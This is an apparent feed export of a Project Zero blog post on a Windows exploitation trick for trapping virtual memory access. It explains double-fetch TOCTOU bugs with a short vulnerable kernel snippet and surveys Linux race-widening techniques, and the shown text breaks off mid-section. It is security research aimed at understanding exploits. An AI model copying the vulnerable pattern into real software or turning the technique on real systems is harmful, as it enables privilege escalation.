    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/01/a-look-at-imessage-in-ios-14.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/405547501763334781" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/405547501763334781" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/01/a-look-at-imessage-in-ios-14.html" title="A Look at iMessage in iOS 14" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-x-zo-b-w89w/YBCYLpT52pI/AAAAAAAAasA/wy9SBgIYdfImsv3Y6VAO4qmQczmHFEI9gCNcBGAsYHQ/s72-c/image1.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-7843265571440320887</id>
    <published>2021-01-21T11:33:00.001-08:00</published>
    <updated>2021-02-04T13:07:31.966-08:00</updated>
    <title type="text">Windows Exploitation Tricks: Trapping Virtual Memory Access</title>
    <content type="html">&lt;style type="text/css"&gt;.lst-kix_rewf8lfzymzq-6&gt;li{counter-increment:lst-ctn-kix_rewf8lfzymzq-6}ol.lst-kix_rewf8lfzymzq-4.start{counter-reset:lst-ctn-kix_rewf8lfzymzq-4 0}.lst-kix_rewf8lfzymzq-0&gt;li{counter-increment:lst-ctn-kix_rewf8lfzymzq-0}.lst-kix_rewf8lfzymzq-7&gt;li:before{content:"" counter(lst-ctn-kix_rewf8lfzymzq-7,lower-latin) ". "}.lst-kix_rewf8lfzymzq-8&gt;li:before{content:"" counter(lst-ctn-kix_rewf8lfzymzq-8,lower-roman) ". "}.lst-kix_fmvhww8n3gvt-6&gt;li:before{content:"\0025cf  "}.lst-kix_fmvhww8n3gvt-5&gt;li:before{content:"\0025a0  "}.lst-kix_fmvhww8n3gvt-7&gt;li:before{content:"\0025cb  "}ol.lst-kix_rewf8lfzymzq-1.start{counter-reset:lst-ctn-kix_rewf8lfzymzq-1 0}.lst-kix_fmvhww8n3gvt-4&gt;li:before{content:"\0025cb  "}.lst-kix_fmvhww8n3gvt-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_rewf8lfzymzq-8.start{counter-reset:lst-ctn-kix_rewf8lfzymzq-8 0}.lst-kix_2duiues326zm-1&gt;li:before{content:"\0025cb  "}.lst-kix_2duiues326zm-0&gt;li:before{content:"\0025cf  "}ol.lst-kix_rewf8lfzymzq-4{list-style-type:none}ol.lst-kix_rewf8lfzymzq-0.start{counter-reset:lst-ctn-kix_rewf8lfzymzq-0 0}ol.lst-kix_rewf8lfzymzq-5{list-style-type:none}ol.lst-kix_rewf8lfzymzq-2{list-style-type:none}ol.lst-kix_rewf8lfzymzq-3{list-style-type:none}ol.lst-kix_rewf8lfzymzq-8{list-style-type:none}ol.lst-kix_rewf8lfzymzq-6{list-style-type:none}.lst-kix_rewf8lfzymzq-7&gt;li{counter-increment:lst-ctn-kix_rewf8lfzymzq-7}ol.lst-kix_rewf8lfzymzq-7{list-style-type:none}ol.lst-kix_rewf8lfzymzq-0{list-style-type:none}ol.lst-kix_rewf8lfzymzq-1{list-style-type:none}.lst-kix_rewf8lfzymzq-1&gt;li{counter-increment:lst-ctn-kix_rewf8lfzymzq-1}.lst-kix_rewf8lfzymzq-4&gt;li{counter-increment:lst-ctn-kix_rewf8lfzymzq-4}ul.lst-kix_fmvhww8n3gvt-8{list-style-type:none}ul.lst-kix_fmvhww8n3gvt-7{list-style-type:none}ul.lst-kix_fmvhww8n3gvt-6{list-style-type:none}ul.lst-kix_fmvhww8n3gvt-5{list-style-type:none}ul.lst-kix_fmvhww8n3gvt-4{list-style-type:none}ul.lst-kix_fmvhww8n3gvt-3{list-style-type:none}ul.lst-kix_fmvhww8n3gvt-2{list-style-type:none}ul.lst-kix_fmvhww8n3gvt-1{list-style-type:none}ol.lst-kix_rewf8lfzymzq-7.start{counter-reset:lst-ctn-kix_rewf8lfzymzq-7 0}ul.lst-kix_fmvhww8n3gvt-0{list-style-type:none}.lst-kix_rewf8lfzymzq-3&gt;li{counter-increment:lst-ctn-kix_rewf8lfzymzq-3}ul.lst-kix_2duiues326zm-8{list-style-type:none}ul.lst-kix_2duiues326zm-7{list-style-type:none}ul.lst-kix_2duiues326zm-6{list-style-type:none}ul.lst-kix_2duiues326zm-5{list-style-type:none}ul.lst-kix_2duiues326zm-4{list-style-type:none}ul.lst-kix_2duiues326zm-3{list-style-type:none}ol.lst-kix_rewf8lfzymzq-6.start{counter-reset:lst-ctn-kix_rewf8lfzymzq-6 0}ul.lst-kix_2duiues326zm-2{list-style-type:none}ul.lst-kix_2duiues326zm-1{list-style-type:none}ul.lst-kix_2duiues326zm-0{list-style-type:none}ol.lst-kix_rewf8lfzymzq-3.start{counter-reset:lst-ctn-kix_rewf8lfzymzq-3 0}.lst-kix_2duiues326zm-2&gt;li:before{content:"\0025a0  "}.lst-kix_2duiues326zm-3&gt;li:before{content:"\0025cf  "}.lst-kix_fmvhww8n3gvt-0&gt;li:before{content:"\0025cf  "}.lst-kix_2duiues326zm-4&gt;li:before{content:"\0025cb  "}.lst-kix_2duiues326zm-5&gt;li:before{content:"\0025a0  "}.lst-kix_fmvhww8n3gvt-2&gt;li:before{content:"\0025a0  "}.lst-kix_rewf8lfzymzq-2&gt;li{counter-increment:lst-ctn-kix_rewf8lfzymzq-2}.lst-kix_fmvhww8n3gvt-1&gt;li:before{content:"\0025cb  "}.lst-kix_fmvhww8n3gvt-3&gt;li:before{content:"\0025cf  "}.lst-kix_rewf8lfzymzq-1&gt;li:before{content:"" counter(lst-ctn-kix_rewf8lfzymzq-1,lower-latin) ") "}ol.lst-kix_rewf8lfzymzq-5.start{counter-reset:lst-ctn-kix_rewf8lfzymzq-5 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_2duiues326zm-6&gt;li:before{content:"\0025cf  "}.lst-kix_rewf8lfzymzq-0&gt;li:before{content:"" counter(lst-ctn-kix_rewf8lfzymzq-0,decimal) ") "}.lst-kix_rewf8lfzymzq-5&gt;li:before{content:"(" counter(lst-ctn-kix_rewf8lfzymzq-5,lower-roman) ") "}.lst-kix_2duiues326zm-7&gt;li:before{content:"\0025cb  "}.lst-kix_rewf8lfzymzq-8&gt;li{counter-increment:lst-ctn-kix_rewf8lfzymzq-8}.lst-kix_rewf8lfzymzq-5&gt;li{counter-increment:lst-ctn-kix_rewf8lfzymzq-5}.lst-kix_2duiues326zm-8&gt;li:before{content:"\0025a0  "}.lst-kix_rewf8lfzymzq-6&gt;li:before{content:"" counter(lst-ctn-kix_rewf8lfzymzq-6,decimal) ". "}.lst-kix_rewf8lfzymzq-2&gt;li:before{content:"" counter(lst-ctn-kix_rewf8lfzymzq-2,lower-roman) ") "}.lst-kix_rewf8lfzymzq-3&gt;li:before{content:"(" counter(lst-ctn-kix_rewf8lfzymzq-3,decimal) ") "}ol.lst-kix_rewf8lfzymzq-2.start{counter-reset:lst-ctn-kix_rewf8lfzymzq-2 0}.lst-kix_rewf8lfzymzq-4&gt;li:before{content:"(" counter(lst-ctn-kix_rewf8lfzymzq-4,lower-latin) ") "}ol{margin:0;padding:0}table td,table th{padding:0}.c23{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:210pt;border-top-color:#000000;border-bottom-style:solid}.c34{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:123.8pt;border-top-color:#000000;border-bottom-style:solid}.c10{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c2{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:135.8pt;border-top-color:#000000;border-bottom-style:solid}.c37{-webkit-text-decoration-skip:none;color:#000000;font-weight:400;text-decoration:line-through;vertical-align:baseline;text-decoration-skip-ink:none;font-size:11pt;font-family:"Arial";font-style:normal}.c44{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c4{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c47{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c31{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Courier New";font-style:normal}.c36{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:"Arial";font-style:normal}.c26{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c39{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-family:"Arial";font-style:normal}.c6{padding-top:0pt;padding-bottom:0pt;line-height:1.500000000000001;orphans:2;widows:2;text-align:left}.c11{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c16{font-size:10pt;font-family:"Courier New";color:#000080;font-weight:400}.c8{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c14{font-size:10pt;font-family:"Courier New";color:#0000ff;font-weight:400}.c15{border-spacing:0;border-collapse:collapse;margin-right:auto}.c27{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c45{text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c12{font-size:10pt;font-family:"Courier New";color:#800080;font-weight:400}.c9{font-family:"Courier New";color:#3c78d8;font-weight:400}.c32{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c38{-webkit-text-decoration-skip:none;text-decoration:underline;text-decoration-skip-ink:none}.c29{border:1px solid black;margin:5px}.c17{font-weight:400;font-family:"Courier New"}.c18{font-size:10pt;color:#a82d00}.c22{font-size:10pt;color:#696969}.c21{font-weight:700;font-family:"Courier New"}.c20{color:inherit;text-decoration:inherit}.c19{padding:0;margin:0}.c33{margin-left:36pt;padding-left:0pt}.c41{color:#a31515}.c28{background-color:#e69138}.c24{background-color:#f6b26b}.c35{color:#8b0000}.c1{font-style:italic}.c7{height:11pt}.c43{color:#8a2be2}.c46{color:#3c78d8}.c13{height:0pt}.c42{background-color:#d9d9d9}.c40{background-color:#6aa84f}.c30{color:#6aa84f}.c25{font-size:10pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c32"&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;Posted by James Forshaw, Project Zero&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;This blog is a continuation of my series of Windows exploitation tricks. This one describes an exploitation trick I&amp;rsquo;ve been trying to develop for years, succeeding (mostly, more on that later) on the latest versions of Windows 10. It&amp;rsquo;s a trick to trap access to virtual memory, get feedback when it occurs and delay access indefinitely. The blog will go into some of the background for why this technique is useful, an overview of the research I did to find the trick as well as an overview of the types of vulnerabilities it can be used with.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c44" id="h.uqhfhcghbqm4"&gt;&lt;span class="c31"&gt;Background&lt;/span&gt;&lt;/h2&gt;&lt;p class="c5"&gt;&lt;span&gt;When would you need such an exploitation trick? A good example of the types of security vulnerabilities which can benefit can be found in the seminal &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/42189.pdf"&gt;Bochspwn research&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;by Mateusz Jurczyk and Gynvael Coldwind. The research showed a way of automating the discovery of memory double-fetches in the Windows kernel.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;If you&amp;rsquo;ve not read the paper, a double-fetch is a type of Time-of-Check Time-of-Use (TOCTOU) vulnerability where code reads a value from memory, such as a buffer length, verifies that value is within bounds and then rereads the value from memory before use. By swapping the value in memory between the first and second fetches the verification is bypassed which can lead to security issues such as privilege escalation or information disclosure. The following is a simple example of a double fetch taken from the original paper.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.f96b8fca46080573d1ca2eedbb94fac318e4cab3"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c5"&gt;&lt;span class="c9"&gt;DWORD&lt;/span&gt;&lt;span class="c21 c46"&gt;*&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;lpInputPtr&lt;/span&gt;&lt;span class="c21"&gt;&amp;nbsp;=&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c30"&gt;// &lt;/span&gt;&lt;span class="c17 c30"&gt;controlled user-mode address&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c9"&gt;UCHAR&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp; LocalBuffer[256];&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;if &lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c21 c24"&gt;*&lt;/span&gt;&lt;span class="c17 c24"&gt;lpInputPtr&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;&amp;gt; &lt;/span&gt;&lt;span class="c9"&gt;sizeof&lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c17"&gt;LocalBuffer&lt;/span&gt;&lt;span class="c21"&gt;))&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;{ &amp;#9312;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;return&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;STATUS_INVALID_PARAMETER;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;RtlCopyMemory&lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c17"&gt;LocalBuffer, lpInputPtr, &lt;/span&gt;&lt;span class="c21 c24"&gt;*&lt;/span&gt;&lt;span class="c17 c24"&gt;lpInputPtr&lt;/span&gt;&lt;span class="c21"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;;&amp;#9313;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;This code copies a buffer from a controlled user mode address into a fixed sized stack buffer. The buffer starts with a &lt;/span&gt;&lt;span class="c1"&gt;DWORD &lt;/span&gt;&lt;span&gt;size value which indicates the total size of the buffer. Memory corruption can occur if the size value pointed to by &lt;/span&gt;&lt;span class="c1"&gt;lpInputBuffer&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;changes between the first read of the size value to compare against the buffer size &amp;#9312; and the second read of the size when copying into the buffer &amp;#9313;. For example, if the first time the value is read it&amp;rsquo;s 100 and the second it&amp;rsquo;s 400 then the code will pass the size check as 100 is less than 256 but will then copy 400 bytes into that buffer corrupting the stack.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;Once a vulnerability such as this example was discovered Mateusz and Gynvael needed to exploit it. How they achieved exploitation is detailed in section 4 of the paper. The exploit techniques that were identified were all probabilistic. Exploitation typically required two threads racing each other, with one reading and one writing. The probabilistic nature of success is due to the probability that in between the first read from a memory location and the second read the writing thread sets a new value which exploits the vulnerability.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;To widen the TOCTOU window many of the techniques described abuse the behavior of virtual memory on Windows. A process on Windows can typically access a large virtual memory region up to 8TiB size. This size is likely to be significantly larger than the physical memory in the system, especially considering the limit is per-process, not per-system. Therefore to maintain the illusion of such a large memory address space the kernel uses on-demand memory paging.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;When memory is allocated in the process the CPU&amp;rsquo;s page tables are set up to indicate the presence of the memory region but are marked as invalid. At this point the virtual memory region has been allocated but there is no physical memory backing it. When the process tries to access that memory region the CPU will generate an exception, generally referred to as a page-fault, which is handled by the kernel. &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;The kernel can look up the memory address which was accessed to cause the page-fault and try and fix the address. How the page-fault is fixed depends on the type of memory access. A simple example is if the memory was allocated but not yet used the kernel will get a physical memory page, initialize it to zeros then adjust the page tables to map that new physical memory page at the faulting address. Once the page-fault has been fixed the faulting thread can be restarted at the instruction which accessed the memory and the memory access should now succeed as if it was always present.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;A more complex scenario is if the page is part of a memory mapped file. In this case the kernel will need to request that the page&amp;rsquo;s data is read back from disk before it can satisfy the page-fault. This can take quite a long time, at least for spinning rust disks, so it might require the faulting thread to be suspended while it waits for the page to be read. Once the page has been read the memory can be fixed up, the original thread can be resumed and the thread restarted at the faulting instruction.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c1"&gt;&lt;a href="https://1.bp.blogspot.com/-CTshtFzpZZg/YAhvVabh38I/AAAAAAAAaqw/t-S2XtYBdZYTrUdcHdXaF2Iv3EiRlHXoACNcBGAsYHQ/s602/image6.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-CTshtFzpZZg/YAhvVabh38I/AAAAAAAAaqw/t-S2XtYBdZYTrUdcHdXaF2Iv3EiRlHXoACNcBGAsYHQ/s600/image6.png" border="0" alt="Overview diagram of page fault causing access to the file system. A user application is shown reading memory from a file mapped into memory. When the memory read occurs a page fault is generated in the kernel. As the memory is part of a file mapping this calls into the IO Manager which then requests the file data from the file system. The read data is then returned back through the kernel to satisfy the page fault and the user application can complete the memory read." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;The end result is it can take a significant amount of time, relative to a CPU&amp;rsquo;s native speed that is, to handle a page-fault. However, abusing these virtual memory behaviors only widens the TOCTOU window, it didn&amp;rsquo;t allow for precise timing to swap values in memory. The result is the exploitation techniques still came with limitations. For example, it was very slow if not impossible in some cases to exploit on a machine with a single CPU core as it relies on having concurrent threads reading and writing. &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;An ideal exploit primitive would be one where the exploitation window can be made arbitrarily large so that it becomes trivial to win the race. Taking previous experience and knowledge of existing bug classes my ideal primitive would be one which meets a set of criteria:&lt;/span&gt;&lt;/p&gt;&lt;ul style='padding: 0;' class="c19 lst-kix_fmvhww8n3gvt-0 start"&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;Works on a default installation of Windows 10 20H2.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;Gives a clear signal when memory is read or written.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;Works when memory is accessed from both user and kernel mode.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;Allows for delaying memory access indefinitely.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;The data in the memory accessed is arbitrary.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;The primitive can be set up from a range of privilege levels.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;Can trap multiple times during the same exploit.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;While meeting all these criteria would be ideal, there&amp;rsquo;s no guarantee we&amp;rsquo;ll meet all or any of them. If we only meet some then the range of exploitation vulnerabilities might be limited. Let&amp;rsquo;s start with a quick overview of the existing work which might give us an idea of how to proceed to find a primitive.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c44" id="h.f1loo4w1iipo"&gt;&lt;span class="c31"&gt;Existing Work&lt;/span&gt;&lt;/h2&gt;&lt;p class="c5"&gt;&lt;span&gt;Having spoken to Mateusz and made an effort to look for any subsequent work there seems to be little novel work over and above the original Bochspwn paper on the exploitation of these types of TOCTOU issues. At least this is true for exploitation on Windows, however, novel techniques have been developed on other platforms, &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf"&gt;specifically Linux&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. Both of these techniques rely on the behavior of virtual memory I previously described.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;The first technique in Linux makes use of &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html"&gt;Userfault File Descriptor (userfaultfd)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get notifications when page-faults occur in a process. With &lt;/span&gt;&lt;span class="c1"&gt;userfaultfd &lt;/span&gt;&lt;span&gt;enabled a secondary thread in the process can read a notification and handle the page-fault in user mode. Handling the fault could be mapping memory at the appropriate location or changing page protection. The key is the faulting thread is suspended until the page-fault is handled by another thread. Therefore if a kernel function accessed the memory the request will be trapped until it&amp;#39;s completed. This allows for a primitive where the memory access can be delayed indefinitely as well as having a timing signal for the access. Using &lt;/span&gt;&lt;span class="c1"&gt;userfaultfd&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;also allows the fault to be distinguished between read and write faults as the memory page can be write-protected &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;Using &lt;/span&gt;&lt;span class="c1"&gt;userfaultdd &lt;/span&gt;&lt;span&gt;works for in-process access such as from the kernel, but is not really useful if the code accessing the memory is in another process.&lt;/span&gt;&lt;span&gt;&amp;nbsp;To solve that problem you can use the &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://www.kernel.org/doc/html/latest/filesystems/fuse.html"&gt;FUSE file system&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;as Jann Horn demonstrated in a previous Project Zero &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://googleprojectzero.blogspot.com/2016/06/exploiting-recursion-in-linux-kernel_20.html"&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. A FUSE file system is implemented entirely in user mode, but any requests for the file go through the Linux kernel&amp;rsquo;s Virtual File System APIs. As a file is accessed as if it was implemented by an in-kernel file system it&amp;rsquo;s possible to map that file into memory using &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://man7.org/linux/man-pages/man2/mmap.2.html"&gt;mmap&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. When a page-fault occurs on a FUSE backed memory region a request will be made to the user-mode file system daemon which can delay the read or write request indefinitely. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="c44" id="h.8obi7645vcqz"&gt;&lt;span class="c31"&gt;Remote File Systems&lt;/span&gt;&lt;/h2&gt;&lt;p class="c5"&gt;&lt;span&gt;As far as I can tell there&amp;rsquo;s nothing equivalent to Linux&amp;rsquo;s &lt;/span&gt;&lt;span class="c1"&gt;userfaultd&lt;/span&gt;&lt;span&gt;&amp;nbsp;on Windows. One feature which caught my eye was &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-getwritewatch"&gt;memory write watches&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. But those seem to just allow an application to query if memory had been written to since the last time it was checked and doesn&amp;rsquo;t allow memory writes to be trapped.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;If we can&amp;rsquo;t just trap page-faults to virtual memory what about mapping a file on a user-mode filesystem like FUSE? Unfortunately there is no built-in FUSE driver in Windows 10 (yet?), but that doesn&amp;rsquo;t mean there&amp;rsquo;s no mechanism to implement a file system in user-mode. There are some efforts to make a real FUSE on Windows, such as the &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="http://www.secfs.net/winfsp/"&gt;WinFsp project&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;, but I&amp;rsquo;d expect the chances of them being installed on a real system to be vanishingly small.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span 